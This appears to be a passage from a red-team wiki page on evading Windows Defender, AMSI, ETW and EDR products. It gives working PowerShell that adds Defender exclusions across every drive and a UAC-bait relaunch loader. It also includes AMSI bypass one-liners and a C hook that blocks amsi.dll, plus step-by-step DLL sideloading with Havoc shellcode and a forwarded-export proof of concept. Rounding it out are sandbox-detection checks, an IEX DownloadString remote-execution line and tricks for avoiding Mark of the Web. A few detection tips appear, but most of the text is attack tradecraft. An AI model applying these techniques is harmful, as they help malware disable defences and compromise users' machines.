  \ [**@m2rc_p**](https://twitter.com/m2rc_p)**!**\n\n## Stop Defender\n\n- [defendnot](https://github.com/es3n1n/defendnot):\
  \ A tool to stop Windows Defender from working.\n- [no-defender](https://github.com/es3n1n/no-defender): A tool to stop\
  \ Windows Defender from working faking another AV.\n- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)\n\
  \n### Installer-style UAC bait before tampering with Defender\n\nPublic loaders masquerading as game cheats frequently ship\
  \ as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. The flow\
  \ is simple:\n\n1. Probe for administrative context with `net session`. The command only succeeds when the caller holds\
  \ admin rights, so a failure indicates the loader is running as a standard user.\n2. Immediately relaunch itself with the\
  \ `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.\n\n```powershell\n\
  if (-not (net session 2>$null)) {\n    powershell -WindowStyle Hidden -Command \"Start-Process cmd.exe -Verb RunAs -WindowStyle\
  \ Hidden -ArgumentList '/c \"\"`<path_to_loader`>\"\"'\"\n    exit\n}\n```\n\nVictims already believe they are installing\
  \ “cracked” software, so the prompt is usually accepted, giving the malware the rights it needs to change Defender’s policy.\n\
  \n### Blanket `MpPreference` exclusions for every drive letter\n\nOnce elevated, GachiLoader-style chains maximize Defender\
  \ blind spots instead of disabling the service outright. The loader first kills the GUI watchdog (`taskkill /F /IM SecHealthUI.exe`)\
  \ and then pushes **extremely broad exclusions** so every user profile, system directory, and removable disk becomes unscannable:\n\
  \n```powershell\n$targets = @('C:\\Users\\', 'C:\\ProgramData\\', 'C:\\Windows\\')\nGet-PSDrive -PSProvider FileSystem |\
  \ ForEach-Object { $targets += $_.Root }\n$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath\
  \ $_ }\nAdd-MpPreference -ExclusionExtension '.sys'\n```\n\nKey observations:\n\n- The loop walks every mounted filesystem\
  \ (D:\\, E:\\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.\n- The `.sys` extension\
  \ exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.\n\
  - All changes land under `HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions`, letting later stages confirm the exclusions\
  \ persist or expand them without re-triggering UAC.\n\nBecause no Defender service is stopped, naïve health checks keep\
  \ reporting “antivirus active” even though real-time inspection never touches those paths.\n\n## **AV Evasion Methodology**\n\
  \nCurrently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and\
  \ for the more advanced EDRs, behavioural analysis.\n\n### **Static detection**\n\nStatic detection is achieved by flagging\
  \ known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself\
  \ (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools\
  \ may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways\
  \ of getting around this sort of detection:\n\n- **Encryption**\n\nIf you encrypt the binary, there will be no way for AV\
  \ of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.\n\n- **Obfuscation**\n\
  \nSometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming\
  \ task depending on what you're trying to obfuscate.\n\n- **Custom tooling**\n\nIf you develop your own tools, there will\
  \ be no known bad signatures, but this takes a lot of time and effort.\n\n> [!TIP]\n> A good way for checking against Windows\
  \ Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into\
  \ multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the\
  \ flagged strings or bytes in your binary.\n\nI highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)\
  \ about practical AV Evasion.\n\n### **Dynamic analysis**\n\nDynamic analysis is when the AV runs your binary in a sandbox\
  \ and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on\
  \ LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.\n\n\
  - **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis.\
  \ AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis\
  \ of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.\n- **Checking\
  \ machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could\
  \ slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even\
  \ the fan speeds, not everything will be implemented in the sandbox.\n- **Machine-specific checks** If you want to target\
  \ a user who's workstation is joined to the \"contoso.local\" domain, you can do a check on the computer's domain to see\
  \ if it matches the one you've specified, if it doesn't, you can make your program exit.\n\nIt turns out that Microsoft\
  \ Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation,\
  \ if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.\n\n<figure><img\

  \nSome other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes\n\n<figure><img\
  \ src=\"../images/image (248).png\" alt=\"\"><figcaption><p><a href=\"https://discord.com/servers/red-team-vx-community-1012733841229746240\"\
  >Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>\n\nAs we've said before in this post, **public tools**\
  \ will eventually **get detected**, so, you should ask yourself something:\n\nFor example, if you want to dump LSASS, **do\
  \ you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.\n\n\
  The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece\
  \ of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around\
  \ AVs, so just look for alternatives for what you're trying to achieve.\n\n> [!TIP]\n> When modifying your payloads for\
  \ evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO\
  \ VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by\
  \ a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied\
  \ with the result.\n\n## EXEs vs DLLs\n\nWhenever it's possible, always **prioritize using DLLs for evasion**, in my experience,\
  \ DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection\
  \ in some cases (if your payload has some way of running as a DLL of course).\n\nAs we can see in this image, a DLL Payload\
  \ from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.\n\n<figure><img\
  \ src=\"../images/image (1130).png\" alt=\"\"><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal\
  \ Havoc DLL</p></figcaption></figure>\n\nNow we'll show some tricks you can use with DLL files to be much more stealthier.\n\
  \n## DLL Sideloading & Proxying\n\n**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning\
  \ both the victim application and malicious payload(s) alongside each other.\n\nYou can check for programs susceptible to\
  \ DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:\n\n```bash\n\
  Get-ChildItem -Path \"C:\\Program Files\\\" -Filter *.exe -Recurse -File -Name| ForEach-Object {\n    $binarytoCheck = \"\
  C:\\Program Files\\\" + $_\n    C:\\Users\\user\\Desktop\\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f\
  \ $binarytoCheck\n}\n```\n\nThis command will output the list of programs susceptible to DLL hijacking inside \"C:\\Program\
  \ Files\\\\\" and the DLL files they try to load.\n\nI highly recommend you **explore DLL Hijackable/Sideloadable programs\
  \ yourself**, this technique is pretty stealthy done properly, but if you use publicly known DLL Sideloadable programs,\
  \ you may get caught easily.\n\nJust by placing a malicious DLL with the name a program expects to load, won't load your\
  \ payload, as the program expects some specific functions inside that DLL, to fix this issue, we'll use another technique\
  \ called **DLL Proxying/Forwarding**.\n\n**DLL Proxying** forwards the calls a program makes from the proxy (and malicious)\
  \ DLL to the original DLL, thus preserving the program's functionality and being able to handle the execution of your payload.\n\
  \nI will be using the [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project from [@flangvik](https://twitter.com/Flangvik/)\n\
  \nThese are the steps I followed:\n\n```\n1. Find an application vulnerable to DLL Sideloading (siofra or using Process\
  \ Hacker)\n2. Generate some shellcode (I used Havoc C2)\n3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)\n\
  4. Use SharpDLLProxy to create the proxy dll (.\\SharpDllProxy.exe --dll .\\mimeTools.dll --payload .\\demon.bin)\n```\n\
  \nThe last command will give us 2 files: a DLL source code template, and the original renamed DLL.\n\n<figure><img src=\"\
  ../images/sharpdllproxy.gif\" alt=\"\"><figcaption></figcaption></figure>\n\n```\n5. Create a new visual studio project\
  \ (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should\
  \ have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.\n```\n\
  \nThese are the results:\n\n<figure><img src=\"../images/dll_sideloading_demo.gif\" alt=\"\"><figcaption></figcaption></figure>\n\
  \nBoth our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate\
  \ in [antiscan.me](https://antiscan.me)! I would call that a success.\n\n<figure><img src=\"../images/image (193).png\"\
  \ alt=\"\"><figcaption></figcaption></figure>\n\n> [!TIP]\n> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)\
  \ about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what\
  \ we've discussed more in-depth.\n\n### Abusing Forwarded Exports (ForwardSideLoading)\n\nWindows PE modules can export\
  \ functions that are actually \"forwarders\": instead of pointing to code, the export entry contains an ASCII string of\
  \ the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:\n\n- Load `TargetDll` if\
  \ not already loaded\n- Resolve `TargetFunc` from it\n\nKey behaviors to understand:\n- If `TargetDll` is a KnownDLL, it\
  \ is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).\n- If `TargetDll` is not a KnownDLL,\
  \ the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.\n\
  \nThis enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL\
  \ module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module.\
  \ When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing\
  \ your DllMain.\n\nExample observed on Windows 11:\n\n```\nkeyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface\n\
  ```\n\n`NCRYPTPROV.dll` is not a KnownDLL, so it is resolved via normal search order.\n\nPoC (copy-paste):\n1) Copy the\
  \ signed system DLL to a writable folder\n```\ncopy C:\\Windows\\System32\\keyiso.dll C:\\test\\\n```\n2) Drop a malicious\
  \ `NCRYPTPROV.dll` in the same folder. A minimal DllMain is enough to get code execution; you do not need to implement the\
  \ forwarded function to trigger DllMain.\n```c\n// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c\n\
  #include <windows.h>\nBOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){\n    if (reason == DLL_PROCESS_ATTACH){\n\
  \        HANDLE h = CreateFileA(\"C\\\\\\\\test\\\\\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt\", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,\
  \ FILE_ATTRIBUTE_NORMAL, NULL);\n        if(h!=INVALID_HANDLE_VALUE){ const char *m = \"hello\"; DWORD w; WriteFile(h,m,5,&w,NULL);\
  \ CloseHandle(h);}        \n    }\n    return TRUE;\n}\n```\n3) Trigger the forward with a signed LOLBin:\n```\nrundll32.exe\
  \ C:\\test\\keyiso.dll, KeyIsoSetAuditingInterface\n```\n\nObserved behavior:\n- rundll32 (signed) loads the side-by-side\
  \ `keyiso.dll` (signed)\n- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`\n\
  - The loader then loads `NCRYPTPROV.dll` from `C:\\test` and executes its `DllMain`\n- If `SetAuditingInterface` is not\
  \ implemented, you'll get a \"missing API\" error only after `DllMain` has already run\n\nHunting tips:\n- Focus on forwarded\
  \ exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\\SYSTEM\\CurrentControlSet\\Control\\\
  Session Manager\\KnownDLLs`.\n- You can enumerate forwarded exports with tooling such as:\n```\ndumpbin /exports C:\\Windows\\\
  System32\\keyiso.dll\n# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface\n```\n- See the\
  \ Windows 11 forwarder inventory to search for candidates: https://hexacorn.com/d/apis_fwd.txt\n\nDetection/defense ideas:\n\
  - Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with\
  \ the same base name from that directory\n- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll`\
  \ → `NCRYPTPROV.dll` under user-writable paths\n- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute\
  \ in application directories\n\n## [**Freeze**](https://github.com/optiv/Freeze)\n\n`Freeze is a payload toolkit for bypassing\
  \ EDRs using suspended processes, direct syscalls, and alternative execution methods`\n\nYou can use Freeze to load and\
  \ execute your shellcode in a stealthy manner.\n\n```\nGit clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git\
  \ && cd Freeze && go build Freeze.go)\n1. Generate some shellcode, in this case I used Havoc C2.\n2. ./Freeze -I demon.bin\
  \ -encrypt -O demon.exe\n3. Profit, no alerts from defender\n```\n\n<figure><img src=\"../images/freeze_demo_hacktricks.gif\"\
  \ alt=\"\"><figcaption></figcaption></figure>\n\n> [!TIP]\n> Evasion is just a cat & mouse game, what works today could\
  \ be detected tomorrow, so never rely on only one tool, if possible, try chaining multiple evasion techniques.\n\n## Direct/Indirect\
  \ Syscalls & SSN Resolution (SysWhispers4)\n\nEDRs often place **user-mode inline hooks** on `ntdll.dll` syscall stubs.\
  \ To bypass those hooks, you can generate **direct** or **indirect** syscall stubs that load the correct **SSN** (System\
  \ Service Number) and transition to kernel mode without executing the hooked export entrypoint.\n\n**Invocation options:**\n\
  - **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).\n\
  - **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from\
  \ `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.\n- **Egg-hunt**:\
  \ avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.\n\n**Hook-resistant\
  \ SSN resolution strategies:**\n- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead\
  \ of reading stub bytes.\n- **SyscallsFromDisk**: map a clean `\\KnownDlls\\ntdll.dll`, read SSNs from its `.text`, then\
  \ unmap (bypasses all in-memory hooks).\n- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when\
  \ a stub is clean; fall back to VA inference if hooked.\n- **HW Breakpoint**: set DR0 on the `syscall` instruction and use\
  \ a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.\n\nExample SysWhispers4 usage:\n```bash\n\
  # Indirect syscalls + hook-resistant resolution\npython syswhispers.py --preset injection --method indirect --resolve recycled\n\
  \n# Resolve SSNs from a clean on-disk ntdll\npython syswhispers.py --preset injection --method indirect --resolve from_disk\
  \ --unhook-ntdll\n\n# Hardware breakpoint SSN extraction\npython syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx\
  \ --resolve hw_breakpoint\n```\n\n## AMSI (Anti-Malware Scan Interface)\n\nAMSI was created to prevent \"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)\"\
  . Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**,\
  \ the AV couldn't do anything to prevent it, as it didn't have enough visibility.\n\nThe AMSI feature is integrated into\
  \ these components of Windows.\n\n- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)\n\
  - PowerShell (scripts, interactive use, and dynamic code evaluation)\n- Windows Script Host (wscript.exe and cscript.exe)\n\
  - JavaScript and VBScript\n- Office VBA macros\n\nIt allows antivirus solutions to inspect script behavior by exposing script\
  \ contents in a form that is both unencrypted and unobfuscated.\n\nRunning `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`\
  \ will produce the following alert on Windows Defender.\n\n<figure><img src=\"../images/image (1135).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \nNotice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe\n\
  \nWe didn't drop any file to disk, but still got caught in-memory because of AMSI.\n\nMoreover, starting with **.NET 4.8**,\
  \ C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why\
  \ using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.\n\
  \nThere are a couple of ways to get around AMSI:\n\n- **Obfuscation**\n\nSince AMSI mainly works with static detections,\
  \ therefore, modifying the scripts you try to load can be a good way for evading detection.\n\nHowever, AMSI has the capability\
  \ of unobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done.\
  \ This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable\
  \ names and you'll be good, so it depends on how much something has been flagged.\n\n- **AMSI Bypass**\n\nSince AMSI is\
  \ implemented by loading a DLL into the powershell (also cscript.exe, wscript.exe, etc.) process, it's possible to tamper\
  \ with it easily even running as an unprivileged user. Due to this flaw in the implementation of AMSI, researchers have\
  \ found multiple ways to evade AMSI scanning.\n\n**Forcing an Error**\n\nForcing the AMSI initialization to fail (amsiInitFailed)\
  \ will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation)\
  \ and Microsoft has developed a signature to prevent wider usage.\n\n```bash\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\
  ```\n\nAll it took was one line of powershell code to render AMSI unusable for the current powershell process. This line\
  \ has of course been flagged by AMSI itself, so some modification is needed in order to use this technique.\n\nHere is a\
  \ modified AMSI bypass I took from this [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).\n\
  \n```bash\nTry{#Ams1 bypass technic nº 2\n      $Xdatabase = 'Utils';$Homedrive = 'si'\n      $ComponentDeviceId = \"N`onP\"\
  \ + \"ubl`ic\" -join ''\n      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''\n      $fdx = '@ms' + 'Â£InÂ£'\
  \ + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300\n      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')\n\
  \      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')\n      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}'\
  \ -f $CleanUp,$Homedrive,$Xdatabase))\n      $Spotfix = $SDcleanup.GetField($Rawdata,\"$ComponentDeviceId,Static\")\n  \
  \    $Spotfix.SetValue($null,$true)\n   }Catch{Throw $_}\n```\n\nKeep in mind, that this will probably get flagged once\
  \ this post comes out, so you should not publish any code if your plan is staying undetected.\n\n**Memory Patching**\n\n\
  This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address\
  \ for the \"AmsiScanBuffer\" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it\
  \ with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is\
  \ interpreted as a clean result.\n\n> [!TIP]\n> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)\
  \ for a more detailed explanation.\n\nThere are also many other techniques used to bypass AMSI with powershell, check out\
  \ [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)\
  \ to learn more about them.\n\n### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)\n\nAMSI is initialised only\
  \ after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on\
  \ `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no\
  \ scans occur for that process.\n\nImplementation outline (x64 C/C++ pseudocode):\n```c\n#include <windows.h>\n#include\
  \ <winternl.h>\n\ntypedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);\nstatic pLdrLoadDll realLdrLoadDll;\n\
  \nNTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){\n    if (module && module->Buffer){\n\
  \        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L\"amsi.dll\");\n        if (RtlEqualUnicodeString(module, &amsi,\
  \ TRUE)){\n            // Pretend the DLL cannot be found → AMSI never initialises in this process\n            return STATUS_DLL_NOT_FOUND;\
  \ // 0xC0000135\n        }\n    }\n    return realLdrLoadDll(path, flags, module, handle);\n}\n\nvoid InstallHook(){\n \
  \   HMODULE ntdll = GetModuleHandleW(L\"ntdll.dll\");\n    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, \"LdrLoadDll\"\
  );\n    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll\n    // e.g., Microsoft Detours / MinHook\
  \ / custom 14‑byte jmp thunk\n}\n```\nNotes\n- Works across PowerShell, WScript/CScript and custom loaders alike (anything\
  \ that would otherwise load AMSI).\n- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command\
  \ -`) to avoid long command‑line artefacts.\n- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).\n\
  \nThe tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass\
  \ AMSI.\nThe tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid\
  \ signature by randomized user-defined function, variables, characters expression and applies random character casing to\
  \ PowerShell keywords to avoid signature.\n\n**Remove the detected signature**\n\nYou can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)**\
  \ and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected\
  \ AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for\
  \ the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.\n\n**AV/EDR products\
  \ that uses AMSI**\n\nYou can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.\n\
  \n**Use Powershell version 2**\nIf you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without\
  \ being scanned by AMSI. You can do this:\n\n```bash\npowershell.exe -version 2\n```\n\n## PS Logging\n\nPowerShell logging\
  \ is a feature that allows you to log all PowerShell commands executed on a system. This can be useful for auditing and\
  \ troubleshooting purposes, but it can also be a **problem for attackers who want to evade detection**.\n\nTo bypass PowerShell\
  \ logging, you can use the following techniques:\n\n- **Disable PowerShell Transcription and Module Logging**: You can use\
  \ a tool such as [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs)\
  \ for this purpose.\n- **Use Powershell version 2**: If you use PowerShell version 2, AMSI will not be loaded, so you can\
  \ run your scripts without being scanned by AMSI. You can do this: `powershell.exe -version 2`\n- **Use an Unmanaged Powershell\
  \ Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)\
  \ to spawn a powershell withuot defenses (this is what `powerpick` from Cobal Strike uses).\n\n\n## Obfuscation\n\n> [!TIP]\n\
  > Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make\
  \ easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your\
  \ code that is sensitive or needs to be hidden.\n\n### Deobfuscating ConfuserEx-Protected .NET Binaries\n\nWhen analysing\
  \ malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block\
  \ decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled\
  \ to C# in tools such as dnSpy or ILSpy.\n\n1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts\
  \ it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will\
  \ crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite\
  \ a clean assembly:\n   ```bash\n   # https://github.com/wwh1004/AntiTamperKiller\n   python AntiTamperKiller.py Confused.exe\
  \ Confused.clean.exe\n   ```\n   Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that\
  \ can be useful when building your own unpacker.\n\n2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex**\
  \ (a ConfuserEx-aware fork of de4dot).\n   ```bash\n   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe\n   ```\n\
  \   Flags:\n     • `-p crx` – select the ConfuserEx 2 profile\n     • de4dot will undo control-flow flattening, restore\
  \ original namespaces, classes and variable names and decrypt constant strings.\n\n3.  Proxy-call stripping – ConfuserEx\
  \ replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them\
  \ with **ProxyCall-Remover**:\n   ```bash\n   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe\n   ```\n   After\
  \ this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper\
  \ functions (`Class8.smethod_10`, …).\n\n4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64\
  \ blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores\
  \ it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.\n\nThe above chain restores execution flow **without**\
  \ needing to run the malicious sample – useful when working on an offline workstation.\n\n> \U0001F6C8  ConfuserEx produces\
  \ a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.\n\n#### One-liner\n\
  ```bash\nautotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially\n```\n\n---\n\n- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**:\

  \ some executables from the internet and executing them.\n\nMicrosoft Defender SmartScreen is a security mechanism intended\
  \ to protect the end user against running potentially malicious applications.\n\n<figure><img src=\"../images/image (664).png\"\
  \ alt=\"\"><figcaption></figcaption></figure>\n\nSmartScreen mainly works with a reputation-based approach, meaning that\
  \ uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the\
  \ file (although the file can still be executed by clicking More Info -> Run anyway).\n\n**MoTW** (Mark of The Web) is an\
  \ [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier\
  \ which is automatically created upon download files from the internet, along with the URL it was downloaded from.\n\n<figure><img\
  \ src=\"../images/image (237).png\" alt=\"\"><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from\
  \ the internet.</p></figcaption></figure>\n\n> [!TIP]\n> It's important to note that executables signed with a **trusted**\
  \ signing certificate **won't trigger SmartScreen**.\n\nA very effective way to prevent your payloads from getting the Mark\
  \ of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW)\
  \ **cannot** be applied to **non NTFS** volumes.\n\n<figure><img src=\"../images/image (640).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers\

  \ ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)\n\n<figure><img src=\"../images/packmypayload_demo.gif\"\
  \ alt=\"\"><figcaption></figcaption></figure>\n\n## ETW\n\nEvent Tracing for Windows (ETW) is a powerful logging mechanism\
  \ in Windows that allows applications and system components to **log events**. However, it can also be used by security\
  \ products to monitor and detect malicious activities.\n\nSimilar to how AMSI is disabled (bypassed) it's also possible\
  \ to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. This\
  \ is done by patching the function in memory to return immediately, effectively disabling ETW logging for that process.\n\
  \nYou can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)\
  \ and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.\n\n\n## C# Assembly\
  \ Reflection\n\nLoading C# binaries in memory has been known for quite some time and it's still a very great way for running\
  \ your post-exploitation tools without getting caught by AV.\n\nSince the payload will get loaded directly into memory without\
  \ touching disk, we will only have to worry about patching AMSI for the whole process.\n\nMost C2 frameworks (sliver, Covenant,\
  \ metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there\
  \ are different ways of doing so:\n\n- **Fork\\&Run**\n\nIt involves **spawning a new sacrificial process**, inject your\
  \ post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process.\
  \ This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside**\
  \ our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there\
  \ is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting\
  \ caught by **Behavioural Detections**.\n\n<figure><img src=\"../images/image (215).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \n- **Inline**\n\nIt's about injecting the post-exploitation malicious code **into its own process**. This way, you can\
  \ avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with\
